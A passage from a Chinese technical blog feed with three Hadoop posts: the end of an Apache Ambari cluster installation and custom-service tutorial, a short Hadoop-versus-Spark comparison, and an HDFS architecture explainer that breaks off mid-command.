的版本越高，里面的软件版本也就越高。这里我们选择 HDP2.2，里面的对应的 Hadoop 版本为 2.6.x。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第三步，指定 Agent 机器（如果配置了域，必须包含完整域名，例如本文环境的域为 example.com），这些机器会被安装 Hadoop 等软件包。还记得在安装章节中提到的 SSH 无密码登陆吗，这里需要指定当时在 Ambari Server 机器生成的私钥（ssh-keygen 生成的，公钥已经拷贝到 Ambari Agent 的机器，具体的 SSH 无密码登录配置，可以在网上很容易找到配置方法，不在此赘述）。另外不要选择“Perform manual registration on hosts and do not use SSH“。因为我们需要 Ambari Server 自动去安装 Ambari Agent。具体参见下图示例。 图 3. 安装配置页面 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第四步，Ambari Server 会自动安装 Ambari Agent 到刚才指定的机器列表。安装完成后，Agent 会向 Ambari Server 注册。成功注册后，就可以继续 Next 到下一步。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第五步，这里我们终于看到跟 Hadoop 有关的名词了。在这一步，我们需要选择要安装的软件名称。本文环境选择了 HDFS，YARN + MapReduce2，Zoopkeeper，Storm 以及 Spark。选的越多，就会需要越多的机器内存。选择之后就可以继续下一步了。这里需要注意某些 Service 是有依赖关系的。如果您选了一个需要依赖其他 Service 的一个 Service，Ambari 会提醒安装对应依赖的 Service。参见下图。 图 4. Service 选择页面 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第六步和第七步，分别是选择安装软件所指定的 Master 机器和 Slave 机器，以及 Client 机器。这里使用默认选择即可（真正在生产环境中，需要根据具体的机器配置选择）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第八步，就是 Service 的配置。绝大部分配置已经有默认值，不需要修改。初学者，如果不需要进行调优是可以直接使用默认配置的。有些 Service 会有一些必须的手工配置项，则必须手动输入，才可以下一步。本文环境直接使用默认配置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第九步，Ambari 会总结一个安装列表，供用户审阅。这里没问题，就直接下一步。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第十步，Ambari 会开始安装选择的 Service 到 Ambari Agent 的机器（如下图）。这里可能需要等好一会，因为都是在线安装。安装完成之后，Ambari 就会启动这些 Service。 图 5. Service 的安装进度 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装完成之后，就可以查看 Ambari 的 Dashboard 了。例如下图。 图 6. Ambari 的 Dashboard 页面 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;至此，您专属的 bigdata 集群已经安装完成。 利用 Ambari 管理 Hadoop 集群&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在上一章节中，我们已经体验到 Ambari 为 Hadoop 生态圈的安装提供的便利。这已经省去了很多的人力成本。尤其是对大数据圈子的测试人员来说，自动化就容易了很多。下面我们看看如何通过 Ambari 管理 Hadoop 的集群。 Service Level Action（服务级别的操作）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先我们进到 Ambari 的 GUI 页面，并查看 Dashboard。在左侧的 Service 列表中，我们可以点击任何一个您想要操作的 Service。以 MapReduce2 为例（Hadoop 这里的版本为 2.6.x，也就是 YARN+HDFS+MapReduce），当点击 MapReduce2 后，就会看到该 Service 的相关信息，如下图。 图 7. MapRduce2 的 Service 页面 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;中间部分是 Service 的模块（Component）信息，也就是该 Service 有哪些模块及其数目。右上角有个 Service Action 的按钮，当点击该按钮后就可以看到很多 Service 的控制命令。也就是通过这些 Service Action 命令，对 Service 进行管理的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可能有的人会说，装完 Hadoop 的集群后，并不知道这个集群是不是可用。这时候我们就可以运行一个“Run Service Check”。点击这个命令后，就会出现下图的进度显示。 图 8. MapReduce Service Check &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实这里就是通过运行一个经典的 MapReduce Wordcount 实例，来检查 MapReduce 是不是正常。对于 Service Action 里面的 Start、Stop 的含义就是，启停整个集群所有该 Service 的模块（也就是 Service level）。当执行进度页面弹出来的时候，我们可以点击 Operations 的名字，进而查看每个机器的进度和运行 log。如下图 Stop 的操作。 图 9. 命令执行进度 1 图 10. 命令执行进度 2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;维护模式（Maintenance Mode）以及如何添加一个自定义的命令到 Service Action，我会在后续的连载中进行介绍。 Host Level Action（机器级别的操作）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，我们回到 Ambari 的 Dashboard 页面。页面最上面中间的地方有个 Hosts，点击这个标签，我们就可以看到 Ambari 所管理的机器列表。如下图。 图 11. Ambari 的机器列表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;图片中红色的数字是警告信息（Ambari Alert），这里我们先略过它，后续文章再做介绍。先看左上角的 Actions，点击这个按钮，就可以看到 Host level Action 的选项了，其实和 Service Level 是类似的，只是执行的范围不一样。如下图。当用户选择 All Hosts -&gt; Hosts -&gt; Start All Components，Ambari 就会将所有 Service 的所有模块启动。 图 12. 启动所有 Service 的所有模块 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果用户选择 All Hosts-&gt; DataNodes -&gt; Stop，Ambari 就会把所有机器的 DataNode 这个模块关闭。如下图。 图 13. 关闭所有的 DataNode 模块 Component Level Action（模块级别的操作）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的图中，我们可以看到 Decommisson、Recommission。这些命令其实是自定义的模块级别的操作（Component Level Action）。不过上图中命令一旦执行，就是对多个机器的同个模块执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们现在尝试只对单个机器的一个模块（Component）执行。首先我们回到 Hosts 的页面。这时候点击机器名，我们就会进入到该机器的 Component 页面。如下图。 图 14. Component 页面 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时候只要点击每个 Component（模块）后面的按钮，就可以看到该模块的操作命令了。例如，我们可以停掉这台机器的 DataNode 模块。 图 15. 停止 DataNode 模块 1 图 16. 停止 DataNode 模块 2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于如何给一个模块添加自定义的命令，也会在后续的连载中做介绍。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这一章节中，主要介绍了如何通过三种级别的 Action（操作）管理 Hadoop 的集群。在 Ambari 中已经加入了很多自定义的 Action 去做一些特殊的操作。如果对 Hadoop 生态圈的软件足够熟悉，就可以尝试更多的 Action。可能有的人会问，Ambari 可不可以扩容集群。答案当然是可以的。Ambari 可以给自身的集群添加机器（也就是添加 Ambari Agent），然后将 Service 的模块安装在新的机器，也可以把某些模块安装到已有的其他的机器。篇幅有限，将在后续的连载中介绍更多的内容。 Ambari 的架构和工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Ambari 基本的架构和工作原理如下图 17 所示。 图 17. Ambari 的基本架构 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Ambari Server 会读取 Stack 和 Service 的配置文件。当用 Ambari 创建集群的时候，Ambari Server 传送 Stack 和 Service 的配置文件以及 Service 生命周期的控制脚本到 Ambari Agent。Agent 拿到配置文件后，会下载安装公共源里软件包（Redhat，就是使用 yum 服务）。安装完成后，Ambari Server 会通知 Agent 去启动 Service。之后 Ambari Server 会定期发送命令到 Agent 检查 Service 的状态，Agent 上报给 Server，并呈现在 Ambari 的 GUI 上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Ambari Server 支持 Rest API，这样可以很容易的扩展和定制化 Ambari。甚至于不用登陆 Ambari 的 GUI，只需要在命令行通过 curl 就可以控制 Ambari，以及控制 Hadoop 的 cluster。具体的 API 可以参见 Apache Ambari 的官方网页 API reference。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于安全方面要求比较苛刻的环境来说，Ambari 可以支持 Kerberos 认证的 Hadoop 集群。 扩展 Ambari 管理一个自定义的 Service&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，我们需要规划自定义的 Service 属于哪个 Stack（当然 Stack 也是可以自定义的）。这里为了快速创建一个新的 Service，而且我们已经安装了 HDP 2.2 的 Stack，所以就将自定义的 Service 放在 HDP 2.2 之下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一步，首先在 Ambari Service 机器上找到 HDP 2.2 Stack 的目录，如下图所示。 图 18. HDP 2.2 的目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二步，需要创建一个 Service 目录，我们这里用“SAMPLE”作为目录名。并在 SAMPLE 底下创建 metainfo.xml。示例代码如下。主要解释下 xml 代码中的两个字段 category 和 cardinality。category 指定了该模块（Component）的类别，可以是 MASTER、SLAVE、CLIENT。Cardinality 指的是所要安装的机器数，可以是固定数字 1，可以是一个范围比如 1-2，也可以是 1+，或者 ALL。如果是一个范围的时候，安装的时候会让用户选择机器。另外这里有关 Service 和 Component 的 name 配置要用大写，小写有时候会有问题。Displayname 可以随意设置。 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?xml version="1.0"?&gt;&lt;metainfo&gt; &lt;schemaVersion&gt;2.0&lt;/schemaVersion&gt; &lt;services&gt; &lt;service&gt; &lt;name&gt;SAMPLE&lt;/name&gt; &lt;displayName&gt;My Sample&lt;/displayName&gt; &lt;comment&gt;My v1 Sample&lt;/comment&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;components&gt; &lt;component&gt; &lt;name&gt;MYMASTER&lt;/name&gt; &lt;displayName&gt;My Master&lt;/displayName&gt; &lt;category&gt;MASTER&lt;/category&gt; &lt;cardinality&gt;1&lt;/cardinality&gt; &lt;commandScript&gt; &lt;script&gt;scripts/master.py&lt;/script&gt; &lt;scriptType&gt;PYTHON&lt;/scriptType&gt; &lt;timeout&gt;5000&lt;/timeout&gt; &lt;/commandScript&gt; &lt;/component&gt; &lt;component&gt; &lt;name&gt;MYSALVE&lt;/name&gt; &lt;displayName&gt;My Slave&lt;/displayName&gt; &lt;category&gt;SLAVE&lt;/category&gt; &lt;cardinality&gt;1+&lt;/cardinality&gt; &lt;commandScript&gt; &lt;script&gt;scripts/slave.py&lt;/script&gt; &lt;scriptType&gt;PYTHON&lt;/scriptType&gt; &lt;timeout&gt;5000&lt;/timeout&gt; &lt;/commandScript&gt; &lt;/component&gt; &lt;/components&gt; &lt;osSpecifics&gt; &lt;osSpecific&gt; &lt;osFamily&gt;any&lt;/osFamily&gt; &lt;/osSpecific&gt; &lt;/osSpecifics&gt; &lt;/service&gt; &lt;/services&gt;&lt;/metainfo&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第三步，需要创建 Service 的控制脚本。这里我们需要在 SAMPLE 底下创建一个 package 目录，然后在 package 底下创建目录 scripts ，进而创建 master.py 和 slave.py。这里需要保证脚本路径和上一步中 metainfo.xml 中的配置路径是一致的。这两个 Python 脚本是用来控制 Master 和 Slave 模块的生命周期。脚本中函数的含义也如其名字一样：install 就是安装调用的接口；start、stop 分别就是启停的调用；Status 是定期检查 component 状态的调用；Configure 是安装完成配置该模块的调用。示例目录结构如下图。 图 19. Sample Service 的目录结构 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 脚本的示例代码： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Master.py： 123456789101112131415161718192021222324import sys, osfrom resource_management import *from resource_management.core.exceptions import ComponentIsNotRunningfrom resource_management.core.environment import Environmentfrom resource_management.core.logger import Loggerclass Master(Script): def install(self, env): print "Install My Master" def configure(self, env): print "Configure My Master" def start(self, env): print "Start My Master" def stop(self, env): print "Stop My Master" def status(self, env): print "Status..."if __name__ == "__main__": Master().execute() &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Slave.py: 1234567891011121314151617181920212223import sys, osfrom resource_management import *from resource_management.core.exceptions import ComponentIsNotRunningfrom resource_management.core.environment import Environmentfrom resource_management.core.logger import Loggerclass Slave(Script): def install(self, env): print "Install My Slave" def configure(self, env): print "Configure My Slave" def start(self, env): print "Start My Slave" def stop(self, env): print "Stop My Slave" def status(self, env): print "Status..."if __name__ == "__main__": Slave().execute() &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第四步，需要重启 Ambari Server。因为 Ambari Server 只有在重启的时候才会读取 Service 和 Stack 的配置。命令行执行： 1ambari-server restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第五步，登录 Ambari 的 GUI，点击左下角的 Action，选择 Add Service。如下图： 图 20. Add Service 按钮 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时候就可以看到我们自定义的 Service：SAMPLE。如下图： 图 21. Sample Service 列表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选择左侧 My Sample 后，就可以一路 Next 了，这个过程其实和我们在搭建 Hadoop2.x 集群的时候是类似的。由于这个 Service 没有真的安装包，所以安装过程会非常的快，启动命令也没有真正的逻辑，所以启动过程也是很快的。等最后点击完 Complete，整个安装过程也就结束了。再回到 Ambari 的 Dashboard 的时候，我们就可以看到这个 My Sample 了，如下图： 图 22. My Sample 的 Service 页面 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到此就可以和第四节中管理 Hadoop 集群一样管理我们的 My Sample。例如下图，Stop 我们的 My Sample。 图 23. Stop Sample 页面 1 图 24. Stop Sample 页面 2 图 25. Stop Sample 页面 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进阶的篇幅中，将会探讨如何给我们的 My Sample 自定义一些 Actions，以及 Action 之间的依赖关系如何定义。篇幅有限，这里就先到此为止。希望以上的介绍能够燃起大家对 Ambari 的热情。 总结&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大数据与云计算可谓是如今数据中心中最火的两项技术领域，几乎所有的 IT 服务商都想在这两项技术中有所建树。相信 Ambari 可以帮助一些 Hadoop 的初学者。长远看来，大数据的发展离不开云计算，云计算中 IaaS 可谓已经很成熟，并且价格低廉。这时候许多公司将目光聚集在了 PaaS。大数据的流行更是加速了相关 PaaS 产品的发展，而 Ambari 的出现必然可以拉近 IaaS 和 PaaS 的距离。也就是说有了 Ambari，或许再加上 Docker，那么快速从 IaaS 演进到 PaaS 就显得不是那么困难了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然这里 Ambari 要跟 IaaS 更好的切合，还有个对手那就是 Sahara。它是另一个土生土长的 OpenStack 的子项目，其目的也是为了在 Openstack 上面快速搭建 Hadoop 等集群。期望着这些项目能够快速成长，将来对大家都有所帮助。]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2分钟读懂Hadoop和Spark的异同]]></title>
    <url>%2F2017%2F08%2F18%2FHadoop%2F2.%202%E5%88%86%E9%92%9F%E8%AF%BB%E6%87%82Hadoop%E5%92%8CSpark%E7%9A%84%E5%BC%82%E5%90%8C%2F</url>
    <content type="text"><![CDATA[2分钟读懂Hadoop和Spark的异同&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;谈到大数据，相信大家对Hadoop和Apache Spark这两个名字并不陌生。但我们往往对它们的理解只是提留在字面上，并没有对它们进行深入的思考，下面不妨跟我一块看下它们究竟有什么异同。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决问题的层面不一样 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，Hadoop和Apache Spark两者都是大数据框架，但是各自存在的目的不尽相同。Hadoop实质上更多是一个分布式数据基础设施: 它将巨大的数据集分派到一个由普通计算机组成的集群中的多个节点进行存储，意味着您不需要购买和维护昂贵的服务器硬件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同时，Hadoop还会索引和跟踪这些数据，让大数据处理和分析效率达到前所未有的高度。Spark，则是那么一个专门用来对那些分布式存储的大数据进行处理的工具，它并不会进行分布式数据的存储。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两者可合可分Hadoop除了提供为大家所共识的HDFS分布式数据存储功能之外，还提供了叫做MapReduce的数据处理功能。所以这里我们完全可以抛开Spark，使用Hadoop自身的MapReduce来完成数据的处理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相反，Spark也不是非要依附在Hadoop身上才能生存。但如上所述，毕竟它没有提供文件管理系统，所以，它必须和其他的分布式文件系统进行集成才能运作。这里我们可以选择Hadoop的HDFS,也可以选择其他的基于云的数据系统平台。但Spark默认来说还是被用在Hadoop上面的，毕竟，大家都认为它们的结合是最好的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下是从网上摘录的对MapReduce的最简洁明了的解析: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们要数图书馆中的所有书。你数1号书架，我数2号书架。这就是“Map”。我们人越多，数书就更快。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在我们到一起，把所有人的统计数加在一起。这就是“Reduce”。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Spark数据处理速度秒杀MapReduce &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Spark因为其处理数据的方式不一样，会比MapReduce快上很多。MapReduce是分步对数据进行处理的: ”从集群中读取数据，进行一次处理，将结果写到集群，从集群中读取更新后的数据，进行下一次的处理，将结果写到集群，等等…“ Booz Allen Hamilton的数据科学家Kirk Borne如此解析。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;反观Spark，它会在内存中以接近“实时”的时间完成所有的数据分析：“从集群中读取数据，完成所有必须的分析处理，将结果写回集群，完成，” Born说道。Spark的批处理速度比MapReduce快近10倍，内存中的数据分析速度则快近100倍。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果需要处理的数据和结果需求大部分情况下是静态的，且你也有耐心等待批处理的完成的话，MapReduce的处理方式也是完全可以接受的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但如果你需要对流数据进行分析，比如那些来自于工厂的传感器收集回来的数据，又或者说你的应用是需要多重数据处理的，那么你也许更应该使用Spark进行处理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大部分机器学习算法都是需要多重数据处理的。此外，通常会用到Spark的应用场景有以下方面：实时的市场活动，在线产品推荐，网络安全分析，机器日记监控等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;灾难恢复 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两者的灾难恢复方式迥异，但是都很不错。因为Hadoop将每次处理后的数据都写入到磁盘上，所以其天生就能很有弹性的对系统错误进行处理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Spark的数据对象存储在分布于数据集群中的叫做弹性分布式数据集(RDD: Resilient Distributed Dataset)中。“这些数据对象既可以放在内存，也可以放在磁盘，所以RDD同样也可以提供完成的灾难恢复功能，”Borne指出。]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HDFS 原理、架构与特性介绍]]></title>
    <url>%2F2017%2F08%2F18%2FHadoop%2F5.%20HDFS%20%E5%8E%9F%E7%90%86%E3%80%81%E6%9E%B6%E6%9E%84%E4%B8%8E%E7%89%B9%E6%80%A7%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[HDFS 原理、架构与特性介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本文主要讲述 HDFS原理-架构、副本机制、HDFS负载均衡、机架感知、健壮性、文件删除恢复机制 1.当前HDFS架构详尽分析 HDFS架构 NameNode DataNode Sencondary NameNode 数据存储细节 NameNode 目录结构&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Namenode 的目录结构： 1234$&#123; dfs.name.dir&#125;/current /VERSION /edits /fsimage /fstime &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;dfs.name.dir 是 hdfs-site.xml 里配置的若干个目录组成的列表。 NameNode&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Namenode 上保存着 HDFS 的名字空间。对于任何对文件系统元数据产生修改的操作， Namenode 都会使用一种称为 EditLog 的事务日志记录下来。例如，在 HDFS 中创建一个文件， Namenode 就会在 Editlog 中插入一条记录来表示；同样地，修改文件的副本系数也将往 Editlog 插入一条记录。 Namenode 在本地操作系统的文件系统中存储这个 Editlog 。整个文件系统的名 字空间，包括数据块到文件的映射、文件的属性等，都存储在一个称为 FsImage 的文件中，这 个文件也是放在 Namenode 所在的本地文件系统上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Namenode 在内存中保存着整个文件系统的名字空间和文件数据块映射 (Blockmap) 的映像 。这个关键的元数据结构设计得很紧凑，因而一个有 4G 内存的 Namenode 足够支撑大量的文件 和目录。当 Namenode 启动时，它从硬盘中读取 Editlog 和 FsImage ，将所有 Editlog 中的事务作 用在内存中的 FsImage 上，并将这个新版本的 FsImage 从内存中保存到本地磁盘上，然后删除 旧的 Editlog ，因为这个旧的 Editlog 的事务都已经作用在 FsImage 上了。这个过程称为一个检查 点 (checkpoint) 。在当前实现中，检查点只发生在 Namenode 启动时，在不久的将来将实现支持 周期性的检查点。 HDFS NameSpace&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS 支持传统的层次型文件组织结构。用户或者应用程序可以创建目 录，然后将文件保存在这些目录里。文件系统名字空间的层次结构和大多数 现有的文件系统类似：用户可以创建、删除、移动或重命名文件。当前， HDFS 不支持用户磁盘配额和访问权限控制，也不支持硬链接和软链接。但 是 HDFS 架构并不妨碍实现这些特性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Namenode 负责维护文件系统命名空间，任何对文件系统名字空间或属 性的修改都将被 Namenode 记录下来。应用程序可以设置 HDFS 保存的文件 的副本数目。文件副本的数目称为文件的副本系数，这个信息也是由 Namenode 保存的。 DataNode&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Datanode 将 HDFS 数据以文件的形式存储在本地的文件系统中，它并不知道有 关 HDFS 文件的信息。它把每个 HDFS 数据块存储在本地文件系统的一个单独的文件 中。 Datanode 并不在同一个目录创建所有的文件，实际上，它用试探的方法来确定 每个目录的最佳文件数目，并且在适当的时候创建子目录。在同一个目录中创建所 有的本地文件并不是最优的选择，这是因为本地文件系统可能无法高效地在单个目 录中支持大量的文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当一个 Datanode 启动时，它会扫描本地文件系统，产生一个这些本地文件对应 的所有 HDFS 数据块的列表，然后作为报告发送到 Namenode ，这个报告就是块状态 报告。 配置Secondary NameNode conf/masters文件指定的为Secondary NameNode节点 修改在masters文件中配置了的机器上的conf/hdfs-site.xml文件，加上如下选项： 1234&lt;property&gt; &lt;name&gt;dfs.http.address&lt;/name&gt; &lt;value&gt;namenode.hadoop-host.com:50070&lt;/value&gt;&lt;/property&gt; core-site.xml：这里有2个参数可配置，但一般来说我们不做修改。fs.checkpoint.period表示多长时间记录一次hdfs的镜像。默认是1小时。fs.checkpoint.size表示一次记录多大的size，默认64M。 12345678910&lt;property&gt; &lt;name&gt;fs.checkpoint.period&lt;/name&gt; &lt;value&gt;3600&lt;/value&gt; &lt;description&gt;The number of seconds between two periodic checkpoints. &lt;/description&lt;/property&gt;&lt;property&gt; &lt;name&gt;fs.checkpoint.size&lt;/name&gt; &lt;value&gt;67108864&lt;/value&gt; &lt;description&gt;The size of the current edit log (in bytes) that triggers a periodic checkpoint even if the fs.checkpoint.period hasn't expired. &lt;/description&gt;&lt;/property&gt; Secondary NameNode&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Secondary NameNode 定期合并 fsimage 和 edits 日志，将 edits 日志文件大小控制在一个限度下。 Secondary NameNode处理流程 namenode 响应 Secondary namenode 请求，将 edit log 推送给 Secondary namenode ， 开始重新写一个新的 edit log 。 Secondary namenode 收到来自 namenode 的 fsimage 文件和 edit log 。 Secondary namenode 将 fsimage 加载到内存，应用 edit log ， 并生成一 个新的 fsimage 文件。 Secondary namenode 将新的 fsimage 推送给 Namenode 。 Namenode 用新的 fsimage 取代旧的 fsimage ， 在 fstime 文件中记下检查 点发生的时 HDFS通信协议&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所有的 HDFS 通讯协议都是构建在 TCP/IP 协议上。客户端通过一个可 配置的端口连接到 Namenode ， 通过 ClientProtocol 与 Namenode 交互。而 Datanode 是使用 DatanodeProtocol 与 Namenode 交互。再设计上， DataNode 通过周期性的向 NameNode 发送心跳和数据块来保持和 NameNode 的通信，数据块报告的信息包括数据块的属性，即数据块属于哪 个文件，数据块 ID ，修改时间等， NameNode 的 DataNode 和数据块的映射 关系就是通过系统启动时 DataNode 的数据块报告建立的。从 ClientProtocol 和 Datanodeprotocol 抽象出一个远程调用 ( RPC ）， 在设计上， Namenode 不会主动发起 RPC ， 而是是响应来自客户端和 Datanode 的 RPC 请求。 HDFS的安全模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Namenode 启动后会进入一个称为安全模式的特殊状态。处于安全模式 的 Namenode 是不会进行数据块的复制的。 Namenode 从所有的 Datanode 接收心跳信号和块状态报告。块状态报告包括了某个 Datanode 所有的数据 块列表。每个数据块都有一个指定的最小副本数。当 Namenode 检测确认某 个数据块的副本数目达到这个最小值，那么该数据块就会被认为是副本安全 (safely replicated) 的；在一定百分比（这个参数可配置）的数据块被 Namenode 检测确认是安全之后（加上一个额外的 30 秒等待时间）， Namenode 将退出安全模式状态。接下来它会确定还有哪些数据块的副本没 有达到指定数目，并将这些数据块复制到其他 Datanode 上。 2.HDFS文件读取的解析###文件读取流程 流程分析 使用HDFS提供的客户端开发库Client，向远程的Namenode发起RPC请求； Namenode会视情况返回文件的部分或者全部block列表，对于每个block，Namenode都会返回有该block拷贝的DataNode地址； 客户端开发库Client会选取离客户端最接近的DataNode来读取block；如果客户端本身就是DataNode,那么将从本地直接获取数据. 读取完当前block的数据后，关闭与当前的DataNode连接，并为读取下一个block寻找最佳的DataNode； 当读完列表的block后，且文件读取还没有结束，客户端开发库会继续向Namenode获取下一批的block列表。 读取完一个block都会进行checksum验证，如果读取datanode时出现错误，客户端会通知Namenode，然后再从下一个拥有该block拷贝的datanode继续读。 3.HDFS文件写入的解析文件写入流程 流程分析 使用HDFS提供的客户端开发库Client，向远程的Namenode发起RPC请求； Namenode会检查要创建的文件是否已经存在，创建者是否有权限进行操作，成功则会为文件 创建一个记录，否则会让客户端抛出异常； 当客户端开始写入文件的时候，会将文件切分成多个packets，并在内部以数据队列”data queue”的形式管理这些packets，并向Namenode申请新的blocks，获取用来存储replicas的合适的datanodes列表，列表的大小根据在Namenode中对replication的设置而定。 开始以pipeline（管道）的形式将packet写入所有的replicas中。把packet以流的方式写入第一个datanode，该datanode把该packet存储之后，再将其传递给在此pipeline中的下一个datanode，直到最后一个datanode，这种写数据的方式呈流水线的形式。 最后一个datanode成功存储之后会返回一个ack packet，在pipeline里传递至客户端，在客户端的开发库内部维护着”ack queue”，成功收到datanode返回的ack packet后会从”ack queue”移除相应的packet。 如果传输过程中，有某个datanode出现了故障，那么当前的pipeline会被关闭，出现故障的datanode会从当前的pipeline中移除，剩余的block会继续剩下的datanode中继续以pipeline的形式传输，同时Namenode会分配一个新的datanode，保持replicas设定的数量。 流水线复制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当客户端向 HDFS 文件写入数据的时候，一开始是写到本地临时文件中。假设该文件的副 本系数设置为 3 ，当本地临时文件累积到一个数据块的大小时，客户端会从 Namenode 获取一个 Datanode 列表用于存放副本。然后客户端开始向第一个 Datanode 传输数据，第一个 Datanode 一小部分一小部分 (4 KB) 地接收数据，将每一部分写入本地仓库，并同时传输该部分到列表中 第二个 Datanode 节点。第二个 Datanode 也是这样，一小部分一小部分地接收数据，写入本地 仓库，并同时传给第三个 Datanode 。最后，第三个 Datanode 接收数据并存储在本地。因此， Datanode 能流水线式地从前一个节点接收数据，并在同时转发给下一个节点，数据以流水线的 方式从前一个 Datanode 复制到下一个 更细节的原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户端创建文件的请求其实并没有立即发送给 Namenode ，事实上，在刚开始阶 段 HDFS 客户端会先将文件数据缓存到本地的一个临时文件。应用程序的写操作被透 明地重定向到这个临时文件。当这个临时文件累积的数据量超过一个数据块的大小 ，客户端才会联系 Namenode 。 Namenode 将文件名插入文件系统的层次结构中，并 且分配一个数据块给它。然后返回 Datanode 的标识符和目标数据块给客户端。接着 客户端将这块数据从本地临时文件上传到指定的 Datanode 上。当文件关闭时，在临 时文件中剩余的没有上传的数据也会传输到指定的 Datanode 上。然后客户端告诉 Namenode 文件已经关闭。此时 Namenode 才将文件创建操作提交到日志里进行存储 。如果 Namenode 在文件关闭前宕机了，则该文件将丢失。 4.副本机制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;特点 数据类型单一 副本数比较多 写文件时副本的放置方法 动态的副本创建策略 弱化的副本一致性要求 副本摆放策略 修改副本数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;集群只有三个Datanode，hadoop系统replication=4时，会出现什么情况？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于上传文件到hdfs上时，当时hadoop的副本系数是几，这个文件的块数副本数就会有几份，无论以后你怎么更改系统副本系统，这个文件的副本数都不会改变，也就说上传到分布式系统上的文件副本数由当时的系统副本数决定，不会受replication的更改而变化，除非用命令来更改文件的副本数。因为dfs.replication实质上是client参数，在create文件时可以指定具体replication，属性dfs.replication是不指定具体replication时的采用默认备份数。文件上传后，备份数已定，修改dfs.replication是不会影响以前的文件的，也不会影响后面指定备份数的文件。只影响后面采用默认备份数的文件。但可以利用hadoop提供的命令后期改某文件的备份数：hadoop fs -setrep -R 